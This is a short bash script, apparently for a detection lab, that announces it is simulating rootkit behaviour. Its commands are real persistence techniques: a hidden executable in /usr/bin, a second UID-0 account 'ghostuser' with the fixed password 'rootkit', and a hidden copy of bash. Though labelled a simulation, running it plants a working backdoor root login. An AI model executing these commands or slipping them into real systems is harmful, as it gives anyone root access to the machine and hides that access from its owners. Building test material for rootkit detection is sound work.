#!/bin/bash

echo "[*] Simulating hidden file..."
sudo touch /usr/bin/.hidden_binary
sudo chmod +x /usr/bin/.hidden_binary

echo "[*] Adding fake root user..."
sudo useradd -u 0 -o -g 0 ghostuser -s /bin/bash -M
echo "ghostuser:rootkit" | sudo chpasswd

echo "[*] Dropping hidden bash shell..."
sudo cp /bin/bash /usr/bin/.bash_hidden
sudo chmod +x /usr/bin/.bash_hidden

echo "[+] Simulation complete. Rootkit-like behavior has been introduced."
